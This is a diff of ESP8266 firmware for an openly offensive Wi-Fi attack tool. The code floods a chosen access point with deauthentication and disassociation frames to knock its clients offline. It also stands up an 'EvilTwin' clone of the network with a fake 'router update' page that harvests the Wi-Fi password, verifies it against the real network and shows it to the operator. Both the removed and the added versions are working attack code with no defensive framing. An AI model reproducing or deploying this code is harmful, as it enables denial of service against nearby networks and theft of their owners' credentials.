@@ -1,264 +1,374 @@
+#include <Arduino.h>
 #include <ESP8266WiFi.h>
-#include <ESPAsyncTCP.h>
-#include "DNSServer.h"
-#include "ESPAsyncWebServer.h"
-#include "FS.h"
+#include <DNSServer.h>
+#include <ESP8266WebServer.h>
 
 extern "C" {
-  #include "user_interface.h"
+#include "user_interface.h"
 }
+
 
 typedef struct
- {
-     String bssid;
-     String pwr;
-     String ch;
-     String ssid;
-     String button;
-     uint8_t mac[6];
- }  apObj;
+{
+  String ssid;
+  uint8_t ch;
+  uint8_t bssid[6];
+}  _Network;
 
-apObj apTable[20];
-String targetAP = "FF:FF:FF:FF:FF:FF";
-uint8_t targetMac[6];
-bool deauthingActive=false;
-bool eviltwinActive=false;
-String lastPassword = "";
-uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};  
 
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 1, 1);
 DNSServer dnsServer;
-AsyncWebServer server(80);
-const char HTML[] PROGMEM = "<!DOCTYPE html><html><head><style>table, th, td{font-size: 14px; padding: 4px;border: 1px solid #bfbfbf;} button {padding: 3px; margin-right:3px; }</style></head><body><h1>ESP 8266</h1><table style=\"border-collapse: collapse;\" id=\"ssidlist\"><thead><tr><th>BSSID</th><th>PWR</th><th>Ch</th><th>SSID</th><th></th></tr></thead><tbody></tbody></table><br><button onclick=\"scanSSIDs()\" id=\"scan\">Scan</button><button onclick=\"refreshSSIDs()\" id=\"refresh\">Refresh</button><button onclick=\"deauthTarget(this)\" id=\"deauth\">Start Deauth</button><button onclick=\"eviltwin(this)\" id=\"eviltwin\">Start EvilTwin</button><br><div id=\"tblDiv\"></div><script>function scanSSIDs(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"ssidlist\").children[1].innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/scanSSIDs\", true);xhttp.send();}function refreshSSIDs(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"ssidlist\").children[1].innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/refreshSSIDs\", true);xhttp.send();}function selectTarget(elem){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){refreshSSIDs();}};xhttp.open('GET', '/selectTarget?target=' + elem.parentElement.parentElement.children[0].innerText, true);xhttp.send();}function deauthTarget(elem){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){elem.innerHTML = this.responseText;  refreshSSIDs();}};xhttp.open('GET', '/deauthTarget', true);xhttp.send();}function eviltwin(elem){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){  elem.innerHTML = this.responseText;}};xhttp.open('GET', '/eviltwin', true);xhttp.send();}function checkLogs(){var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() {if (this.readyState == 4 && this.status == 200){document.getElementById(\"tblDiv\").innerHTML = this.responseText;}};xhttp.open(\"GET\", \"/checkLogs\", true);xhttp.send();} checkLogs(); </script></body></html>";
-const char EVILTWIN[] = "<!DOCTYPE html><html><head><title>Router Settings</title></head><body><h1>Firmware update required</h1><input type=\"password\" placeholder=\"Wireless password\" id=\"txtPw\"/><button onclick=\"checkPassword()\" id=\"confirm\">Confirm</button><p id=\"txtResult\"></p><script>function checkPassword(){document.getElementById(\"txtResult\").innerHTML=\"\";var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){ setTimeout(function(){checkResult();}, 5000);}};xhttp.open(\"GET\", \"/checkPassword?password=\" + document.getElementById(\"txtPw\").value, true);xhttp.send();}function checkResult(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"txtResult\").innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/checkResult\", true);xhttp.send();}</script></body></html>";
+ESP8266WebServer webServer(80);
 
+_Network _networks[16];
+_Network _selectedNetwork;
 
-void onRequest(AsyncWebServerRequest *request){
-    Serial.println("/");
-    if (!eviltwinActive){
-      request->send(200, "text/html", HTML);
-    } else {
-      request->send(200, "text/html", EVILTWIN);
-    }
+void clearArray() {
+  for (int i = 0; i < 16; i++) {
+    _Network _network;
+    _networks[i] = _network;
   }
 
-void setup(){
-  //your other setup stuff...
-  delay(500);
+}
+
+String _correct = "";
+String _tryPassword = "";
+
+void setup() {
+
   Serial.begin(115200);
-  delay(500);
+  /*
+    bool res = SPIFFS.begin();
+    File f = SPIFFS.open("/log.txt", "r");
+
+    if (!f) {
+      File f = SPIFFS.open("/f.txt", "w");
+      f.println("Koala");
+      f.println("neznambebi");
+    }
+    f.close();
+  */
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
-  WiFi.softAPConfig(IPAddress(192,168,4,1) , IPAddress(192,168,4,1) , IPAddress(255,255,255,0));
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
   WiFi.softAP("M1z23R", "deauther");
-  dnsServer.start(53, "*", IPAddress(192,168,4,1));
-  WiFi.scanNetworks();
-  
-  server.onNotFound(onRequest);
-  
-  server.on("/scanSSIDs", HTTP_GET, [](AsyncWebServerRequest *request){
-    Serial.println("scanSSIDs");
-    String json = "";
-    targetAP = "FF:FF:FF:FF:FF:FF";
-    int n = WiFi.scanComplete();
-    if(n == -2){WiFi.scanNetworks(true);} else if(n){
-    for (int i = 0; i < n; ++i){
-      apTable[i] = {String("<td>") +  WiFi.BSSIDstr(i) + "</td>", String("<td>") + WiFi.RSSI(i) + "</td>", String("<td>") + WiFi.channel(i) +"</td>", String("<td>") + WiFi.SSID(i) +"</td>", String("<td><button onclick=\"selectTarget(this)\">Select</button></td>")};
+  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
-      for (int b = 0; b < 6; b++){
-          apTable[i].mac[b] = WiFi.BSSID(i)[b];
-          }
-      json += String("<tr><td>") +  WiFi.BSSIDstr(i) + "</td>";json += String("<td>") + WiFi.RSSI(i) + "</td>";json += String("<td>") + WiFi.channel(i) +"</td>";json += String("<td>") + WiFi.SSID(i) +"</td>";json += String("<td><button onclick=\"selectTarget(this)\">Select</button></td></tr>");
-    }
-    WiFi.scanDelete();
-    if(WiFi.scanComplete() == -2){WiFi.scanNetworks(true);}
-    }
-    WiFi.scanDelete();
-    request->send(200, "text/html", json);
-    json = String();});
+  // replay to all requests with same HTML
 
-
-  server.on("/refreshSSIDs", HTTP_GET, [](AsyncWebServerRequest *request){
-    Serial.println("refreshSSIDs");
-    String json = "";
-    for (int ap = 0; ap < 20 && apTable[ap].bssid.length() > 0; ap++){
-      
-      if(apTable[ap].bssid.indexOf(targetAP) > -1) {
-         json += "<tr>" + apTable[ap].bssid + apTable[ap].pwr + apTable[ap].ch + apTable[ap].ssid + "<td><button onclick=\"selectTarget(this)\">Deselect</button></td>" + "</tr>";
-      } else {
-        json += "<tr>" + apTable[ap].bssid + apTable[ap].pwr + apTable[ap].ch + apTable[ap].ssid + apTable[ap].button + "</tr>";
-      }
-    }
-   
-    request->send(200, "text/html", json);
-    json = String();});
-  
-  server.on("/selectTarget", HTTP_GET, [](AsyncWebServerRequest *request){
-    Serial.println("selectTarget");
-    if(request->hasArg("target")){
-      targetAP = request->arg("target");
-        for (int ap = 0; ap < 5; ap++){
-          if (apTable[ap].bssid.indexOf(targetAP) > -1){
-            for (int b =0; b < 6; b++){
-              targetMac[b] = apTable[ap].mac[b];
-              deauthPacket[10+b] = apTable[ap].mac[b];
-              deauthPacket[16+b] = apTable[ap].mac[b];
-              }
-
-            
-          }
-        }
-      
-      };
-    request->send(200, "text/html", "OK");
-    });
-
-  server.on("/deauthTarget", HTTP_GET, [](AsyncWebServerRequest *request){
-    Serial.println("deauthTarget");
-    if (!deauthingActive && targetAP != "FF:FF:FF:FF:FF:FF"){
-        Serial.println("Found target: " + targetAP);
-        deauthingActive=true;
-        request->send(200, "text/html", "Stop Deauth");
-    } else {
-      deauthingActive=false;
-      request->send(200, "text/html", "Start Deauth");
-    }
-    });
-    
-  server.on("/eviltwin", HTTP_GET, [](AsyncWebServerRequest *request){
-    Serial.println("eviltwin");
-    
-    if (!eviltwinActive && targetAP != "FF:FF:FF:FF:FF:FF"){
-        eviltwinActive=true;
-        request->send(200, "text/html", "Started EvilTwin");
-        handle_AP_Changes();
-    } else {
-      eviltwinActive=false;
-      request->send(200, "text/html", "Start EvilTwin");
-    }
-    });
-  server.on("/checkPassword", HTTP_GET, [](AsyncWebServerRequest *request){
-    Serial.println("checkPassword");
-    if(request->hasArg("password")){
-        String passWord = request->arg("password");
-        String targetAcPo = "";
-        for (int ap = 0; ap < 5; ap++){
-          if (apTable[ap].bssid.indexOf(targetAP) > -1){
-            targetAcPo = apTable[ap].ssid;
-          }
-        }
-        targetAcPo.remove(0,4); // trim prefix <td>
-        targetAcPo.remove(targetAcPo.length() - 5,5);
-        lastPassword = passWord;
-        WiFi.begin(targetAcPo.c_str(), passWord.c_str());
-        request->send(200, "text/html", "OK");
-        
-      };
-    });
-  
-  
-  server.on("/checkResult", HTTP_GET, [](AsyncWebServerRequest *request){
-    Serial.println("checkResult");
-    String targetAcPo = "";
-    for (int ap = 0; ap < 5; ap++){
-        if (apTable[ap].bssid.indexOf(targetAP) > -1){
-          targetAcPo = apTable[ap].ssid;
-        }
-    }
-    targetAcPo.remove(0,4); // trim prefix <td>
-    targetAcPo.remove(targetAcPo.length() - 5,5);
-        
-    if(WiFi.status() != WL_CONNECTED) {
-      request->send(200, "text/html", "Wrong password");
-      
-      File file = SPIFFS.open("/logs.txt", "a");
-      if (file) {
-        int bytesWritten = file.println("<tr style=\"background: red;\"><td>" + targetAcPo + "</td><td>" + lastPassword + "</td></tr>");
-        Serial.println(file);
-        file.close();
-      }
-    } else {
-      request->send(200, "text/html", "Your router will be restarted.");
-      File file = SPIFFS.open("/logs.txt", "a");
-      if (file) {
-        int bytesWritten = file.println("<tr style=\"background: green;\"><td>" + targetAcPo + "</td><td>" + lastPassword + "</td></tr>");
-        Serial.println(file);
-        file.close();
-      }
-      eviltwinActive = false;
-      deauthingActive = false;
-      handle_AP_Changes();
-      
-    }
-});
-
-  server.on("/checkLogs", HTTP_GET, [](AsyncWebServerRequest *request){
-    Serial.println("checkLogs");  
-      File f = SPIFFS.open("/logs.txt", "r");
-      String debugLogData;
-      while (f.available()){
-        debugLogData += char(f.read());
-      }
-      Serial.println(debugLogData);
-      request->send(200, "text/html", "</br><table style=\"border-collapse: collapse; margin-top: 5px;\" id=\"tblLogs\"><thead><tr><th>SSID</th><th>Password</th></tr></thead><tbody>" + debugLogData + "<tbody></table>");
-   
-});
-
-    
-  SPIFFS.begin();
-  server.begin();
+  webServer.on("/", handleIndex);
+  webServer.on("/result", handleResult);
+  webServer.on("/admin", handleAdmin);
+  webServer.onNotFound(handleIndex);
+  webServer.begin();
 }
-void handle_AP_Changes(){
-  Serial.println("handle_AP_Changes");
-  if (eviltwinActive) {
-     int result = WiFi.softAPdisconnect (true);
-     String targetAcPo = ""; 
-      for (int ap = 0; ap < 5; ap++){
-          if (apTable[ap].bssid.indexOf(targetAP) > -1){
-            targetAcPo = apTable[ap].ssid;
-            }
-        }
-        targetAcPo.remove(0,4);
-        targetAcPo.remove(targetAcPo.length() - 5,5);
-        dnsServer.stop();
-        
-        WiFi.softAPConfig(IPAddress(192,168,4,1) , IPAddress(192,168,4,1) , IPAddress(255,255,255,0));
-        WiFi.softAP(targetAcPo.c_str());
-        dnsServer.start(53, "*", IPAddress(192,168,4,1));
+void performScan() {
+  int n = WiFi.scanNetworks();
+  clearArray();
+  if (n >= 0) {
+    for (int i = 0; i < n; ++i) {
+      _Network network;
+      network.ssid = WiFi.SSID(i);
+      for (int j = 0; j < 6; j++) {
+        network.bssid[j] = WiFi.BSSID(i)[j];
+      }
+
+      network.ch = WiFi.channel(i);
+      _networks[i] = network;
+    }
+  }
+}
+
+bool hotspot_active = false;
+bool deauthing_active = false;
+
+void handleResult() {
+  String html = "";
+  if (WiFi.status() != WL_CONNECTED) {
+    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>"); // ADD SCRIPT RELOAD LOGIN
+    Serial.println("Wrong password tried !");
   } else {
-     int result = WiFi.softAPdisconnect(true);
-     dnsServer.stop();
-     WiFi.softAPConfig(IPAddress(192,168,4,1) , IPAddress(192,168,4,1) , IPAddress(255,255,255,0));
-     WiFi.softAP("M1z23R", "deauther");
-     dnsServer.start(53, "*", IPAddress(192,168,4,1));
+    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
+    hotspot_active = false;
+    dnsServer.stop();
+    int n = WiFi.softAPdisconnect (true);
+    Serial.println(String(n));
+    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+    WiFi.softAP("M1z23R", "deauther");
+    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
+    Serial.println("Good password was entered !");
+    Serial.println(_correct);
+  }
+}
+
+
+String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
+                   "</head><body><div class='content'>"
+                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
+                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
+                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
+                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
+                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
+
+void handleIndex() {
+
+  if (webServer.hasArg("ap")) {
+    for (int i = 0; i < 16; i++) {
+      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
+        _selectedNetwork = _networks[i];
+      }
+    }
+  }
+
+  if (webServer.hasArg("deauth")) {
+    if (webServer.arg("deauth") == "start") {
+      deauthing_active = true;
+    } else if (webServer.arg("deauth") == "stop") {
+      deauthing_active = false;
+    }
+  }
+
+  if (webServer.hasArg("hotspot")) {
+    if (webServer.arg("hotspot") == "start") {
+      hotspot_active = true;
+
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect (true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+
+    } else if (webServer.arg("hotspot") == "stop") {
+      hotspot_active = false;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect (true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAP("M1z23R", "deauther");
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    }
+    return;
+  }
+
+  if (hotspot_active == false) {
+    String _html = _tempHTML;
+
+    for (int i = 0; i < 16; ++i) {
+      if ( _networks[i].ssid == "") {
+        break;
+      }
+      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
+
+      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
+        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
+      } else {
+        _html += "<button>Select</button></form></td></tr>";
+      }
+    }
+
+    if (deauthing_active) {
+      _html.replace("{deauth_button}", "Stop deauthing");
+      _html.replace("{deauth}", "stop");
+    } else {
+      _html.replace("{deauth_button}", "Start deauthing");
+      _html.replace("{deauth}", "start");
+    }
+
+    if (hotspot_active) {
+      _html.replace("{hotspot_button}", "Stop EvilTwin");
+      _html.replace("{hotspot}", "stop");
+    } else {
+      _html.replace("{hotspot_button}", "Start EvilTwin");
+      _html.replace("{hotspot}", "start");
+    }
+
+
+    if (_selectedNetwork.ssid == "") {
+      _html.replace("{disabled}", " disabled");
+    } else {
+      _html.replace("{disabled}", "");
+    }
+
+    _html += "</table>";
+
+    if (_correct != "") {
+      _html += "</br><h3>" + _correct + "</h3>";
+    }
+    /*
+       Implement read from SPIFFS for all logs
+    */
+
+    _html += "</div></body></html>";
+    webServer.send(200, "text/html", _html);
+
+  } else {
+
+    if (webServer.hasArg("password")) {
+      /*
+        File f = SPIFFS.open("/log.txt", FILE_APPEND);
+        if (f) {
+        f.println(_selectedNetwork.ssid);
+        f.println(webServer.arg("password"));
+        }
+      */
+      _tryPassword = webServer.arg("password");
+      WiFi.disconnect();
+      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
+      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
+    } else {
+      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
+    }
+  }
+
+}
+
+void handleAdmin() {
+
+  String _html = _tempHTML;
+
+  if (webServer.hasArg("ap")) {
+    for (int i = 0; i < 16; i++) {
+      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
+        _selectedNetwork = _networks[i];
+      }
+    }
+  }
+
+  if (webServer.hasArg("deauth")) {
+    if (webServer.arg("deauth") == "start") {
+      deauthing_active = true;
+    } else if (webServer.arg("deauth") == "stop") {
+      deauthing_active = false;
+    }
+  }
+
+  if (webServer.hasArg("hotspot")) {
+    if (webServer.arg("hotspot") == "start") {
+      hotspot_active = true;
+
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect (true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+
+    } else if (webServer.arg("hotspot") == "stop") {
+      hotspot_active = false;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect (true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAP("M1z23R", "deauther");
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    }
+    return;
+  }
+
+  for (int i = 0; i < 16; ++i) {
+    if ( _networks[i].ssid == "") {
+      break;
+    }
+    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";
+
+    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
+      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
+    } else {
+      _html += "<button>Select</button></form></td></tr>";
+    }
+  }
+
+  if (deauthing_active) {
+    _html.replace("{deauth_button}", "Stop deauthing");
+    _html.replace("{deauth}", "stop");
+  } else {
+    _html.replace("{deauth_button}", "Start deauthing");
+    _html.replace("{deauth}", "start");
+  }
+
+  if (hotspot_active) {
+    _html.replace("{hotspot_button}", "Stop EvilTwin");
+    _html.replace("{hotspot}", "stop");
+  } else {
+    _html.replace("{hotspot_button}", "Start EvilTwin");
+    _html.replace("{hotspot}", "start");
   }
 
 
+  if (_selectedNetwork.ssid == "") {
+    _html.replace("{disabled}", " disabled");
+  } else {
+    _html.replace("{disabled}", "");
+  }
+  
+  if (_correct != "") {
+    _html += "</br><h3>" + _correct + "</h3>";
+  }
+  
+  _html += "</table></div></body></html>";
+  webServer.send(200, "text/html", _html);
+
 }
-unsigned long now =0;
-void loop(){
+
+String bytesToStr(const uint8_t* b, uint32_t size) {
+  String str;
+  const char ZERO = '0';
+  const char DOUBLEPOINT = ':';
+  for (uint32_t i = 0; i < size; i++) {
+    if (b[i] < 0x10) str += ZERO;
+    str += String(b[i], HEX);
+
+    if (i < size - 1) str += DOUBLEPOINT;
+  }
+  return str;
+}
+
+unsigned long now = 0;
+unsigned long wifinow = 0;
+unsigned long deauth_now = 0;
+
+uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+uint8_t wifi_channel = 1;
+
+void loop() {
   dnsServer.processNextRequest();
-  if(deauthingActive && millis() - now >= 1000) {
-    
+  webServer.handleClient();
+
+  if (deauthing_active && millis() - deauth_now >= 1000) {
+
+    wifi_set_channel(_selectedNetwork.ch);
+
+    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
+
+    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
+    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
+    deauthPacket[24] = 1;
+
     Serial.println(bytesToStr(deauthPacket, 26));
     deauthPacket[0] = 0xC0;
     Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
     Serial.println(bytesToStr(deauthPacket, 26));
     deauthPacket[0] = 0xA0;
     Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
-   
+
+    deauth_now = millis();
+  }
+
+  if (millis() - now >= 15000) {
+    performScan();
     now = millis();
-    }
-}
+  }
 
-String bytesToStr(const uint8_t* b, uint32_t size) {
-    String str;
-    const char ZERO = '0';
-    const char DOUBLEPOINT = ':';
-    for (uint32_t i = 0; i < size; i++) {
-        if (b[i] < 0x10) str += ZERO;
-        str += String(b[i], HEX);
-
-        if (i < size - 1) str += DOUBLEPOINT;
+  if (millis() - wifinow >= 2000) {
+    if (WiFi.status() != WL_CONNECTED) {
+      Serial.println("BAD");
+    } else {
+      Serial.println("GOOD");
     }
-    return str;
+    wifinow = millis();
+  }
 }
